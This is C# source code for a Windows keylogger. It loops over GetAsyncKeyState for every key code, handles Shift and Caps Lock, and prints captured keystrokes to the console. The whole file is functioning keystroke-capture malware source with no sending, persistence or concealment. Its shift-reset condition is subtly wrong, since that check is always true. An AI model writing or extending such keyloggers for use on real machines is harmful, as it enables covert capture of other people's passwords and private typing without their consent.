using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Keylogger
{
    static class Program
    {

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            bool isShift = false;
            bool isCapital = false;

            while (true)
            {
                Thread.Sleep(120);
                
                for (int keyCode = 0; keyCode < 255; keyCode++)
                {
                    int keyState = GetAsyncKeyState(keyCode);

                    if (keyState != 0)
                    {
                        String keyString = "";

                        // If shift pressed
                        if ( 
                            (((Keys)keyCode) == Keys.ShiftKey) ||
                            (((Keys)keyCode) == Keys.LShiftKey) ||
                            (((Keys)keyCode) == Keys.RShiftKey)
                        ) { 
                            isShift = !isShift; 
                        }
                        // If capital pressed
                        else  if (((Keys)keyCode) == Keys.Capital)
                        {
                            isCapital = !isCapital;
                        }


                        if (
                                (!isShift && !isCapital) &&
                                (keyCode >= 65 && keyCode <= 90)
                            ) 
                        {
                           keyString = ((Keys)keyCode).ToString().ToLower();          
                        } 
                        else
                        {
                            // Replace caracters
                            if (((Keys)keyCode) == Keys.Space) { keyString = " "; }
                            else if (((Keys)keyCode) == Keys.Enter) { keyString = "\n"; }
                            else if (((Keys)keyCode) == Keys.Tab) { keyString = "\t"; }
                            else if ((((Keys)keyCode) == Keys.LButton) || (((Keys)keyCode) == Keys.RButton)) { keyString = ""; } // Ignore the mouse buttons
                            else
                            {
                                keyString = ((Keys)keyCode).ToString(); // Convert from ASCII to STRING
                            }
                            
                        }


                        Console.Write(keyString);

                        if (
                            (isShift) &&
                            (
                                (((Keys)keyCode) != Keys.ShiftKey) ||
                                (((Keys)keyCode) != Keys.LShiftKey) ||
                                (((Keys)keyCode) != Keys.RShiftKey)
                            )
                        ) {
                            isShift = false;
                        }
                        
                    }
                }
            }

        }

    }
}
